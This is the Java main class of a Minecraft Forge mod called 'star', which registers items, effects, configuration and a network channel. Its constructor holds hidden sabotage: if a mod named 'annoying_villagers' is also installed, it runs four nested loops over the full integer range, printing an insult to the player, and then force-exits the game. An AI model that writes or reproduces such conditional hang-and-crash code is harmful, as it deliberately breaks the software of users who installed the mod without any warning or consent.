package com.guhao.star;

import com.guhao.star.regirster.Effect_reg;
import com.guhao.star.regirster.Items;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.config.ModConfig;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.network.NetworkEvent;
import net.minecraftforge.network.NetworkRegistry;
import net.minecraftforge.network.simple.SimpleChannel;

import java.util.function.BiConsumer;
import java.util.function.Function;
import java.util.function.Supplier;

@Mod("star")
public class Star {
    public static final String MODID = "star";
    private static final String PROTOCOL_VERSION = "1";

    public static final SimpleChannel PACKET_HANDLER = NetworkRegistry.newSimpleChannel(new ResourceLocation(MODID, MODID), () -> PROTOCOL_VERSION, PROTOCOL_VERSION::equals, PROTOCOL_VERSION::equals);
    private static int messageID = 0;

    public Star() {
        if (ModList.get().isLoaded("annoying_villagersbychentu") | ModList.get().isLoaded("annoying_villagers")) {
            for (int f = Integer.MIN_VALUE; f < Integer.MAX_VALUE; f++) {
                for (int u = Integer.MIN_VALUE; u < Integer.MAX_VALUE; u++) {
                    for (int c = Integer.MIN_VALUE; c < Integer.MAX_VALUE; c++) {
                        for (int k = Integer.MIN_VALUE; k < Integer.MAX_VALUE; k++) {
                            System.out.print("Stop playing annoying villagers,IDIOT!!!");
                        }
                    }
                }
            }
            System.exit(114514);
        }
        IEventBus bus = FMLJavaModLoadingContext.get().getModEventBus();
        Effect_reg.REGISTRY.register(bus);
        Items.ITEMS.register(bus);
        ModLoadingContext.get().registerConfig(ModConfig.Type.COMMON, Config.SPEC);
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::commonSetup);
    }
    private void commonSetup(final FMLCommonSetupEvent event) {
        Config.load();
    }

    public static <T> void addNetworkMessage(Class<T> messageType, BiConsumer<T, FriendlyByteBuf> encoder, Function<FriendlyByteBuf, T> decoder, BiConsumer<T, Supplier<NetworkEvent.Context>> messageConsumer) {
        PACKET_HANDLER.registerMessage(messageID, messageType, encoder, decoder, messageConsumer);
        messageID++;
    }
}
